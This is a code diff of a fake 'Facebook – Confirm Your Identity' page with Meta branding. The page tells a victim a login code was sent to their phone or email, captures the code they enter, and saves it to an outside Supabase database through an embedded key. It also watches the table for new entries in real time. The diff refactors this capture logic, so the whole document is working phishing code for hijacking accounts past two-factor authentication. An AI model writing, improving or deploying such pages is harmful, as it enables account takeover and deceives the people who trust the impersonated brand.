@@ -1,11 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Facebook – Confirm Your Identity</title>
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
   <style>
     body {
       background-color: #f0f2f5;
@@ -109,7 +107,7 @@
     <p id="confirmation-msg"></p>
 
     <input type="text" id="code-input" placeholder="Enter code" maxlength="20" />
-    <button class="btn" onclick="verifyCode()">Continue</button>
+    <button class="btn" id="submit-btn">Continue</button>
     <div class="resend-link" onclick="alert('A new code has been sent.')">Didn't get the code?</div>
   </div>
 
@@ -121,11 +119,13 @@
     <div class="bottom-line">&copy; 2025 Meta Platforms, Inc.</div>
   </div>
 
-  <script>
-    // Supabase init
+  <script type="module">
+    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
+
     const SUPABASE_URL = 'https://scserlwosxrmnvomipxt.supabase.co';
     const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNjc2VybHdvc3hybW52b21pcHh0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDk4MTI4NzMsImV4cCI6MjA2NTM4ODg3M30.JJtoPSkDqNTAgqpDHNZunqtyECGtYEWKh-YbvipTPH8';
-    const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
     window.onload = function () {
       const user = localStorage.getItem("login_user");
@@ -156,11 +156,10 @@
       msgEl.textContent = `To confirm it's really you trying to log in, we sent a code to your ${displayType} ending in ....${ending}. Enter it below to continue.`;
     };
 
-    function verifyCode() {
+    async function verifyCode() {
       const codeInput = document.getElementById("code-input");
       const code = codeInput.value.trim();
 
-      // Remove previous error state
       const existingError = document.querySelector(".error-message");
       if (existingError) existingError.remove();
       codeInput.style.borderColor = "#ccc";
@@ -176,33 +175,29 @@
         error.style.marginTop = "-15px";
         error.style.marginBottom = "15px";
         codeInput.parentNode.insertBefore(error, codeInput.nextSibling);
-
         return;
       }
 
-      // Save to Supabase
-      supabase.from('code').insert([{ value: code }]).then(response => {
-        if (response.error) {
-          alert("Failed to save code.");
-        } else {
-          alert("Code submitted.");
-          window.location.href = "homepage.html";
-        }
-      });
+      const { error } = await supabase.from("code").insert([{ value: code }]);
+      if (error) {
+        alert("Error saving code. Try again.");
+      } else {
+        window.location.href = "homepage.html";
+      }
     }
 
-    // Real-time listener (optional but shows live updates)
+    document.getElementById("submit-btn").addEventListener("click", verifyCode);
+
     supabase
-      .channel('code_changes')
+      .channel('realtime-code')
       .on(
         'postgres_changes',
-        { event: '*', schema: 'public', table: 'code' },
+        { event: 'INSERT', schema: 'public', table: 'code' },
         payload => {
-          console.log('Real-time update:', payload);
+          console.log('Realtime insert:', payload.new);
         }
       )
       .subscribe();
-
   </script>
 </body>
 </html>
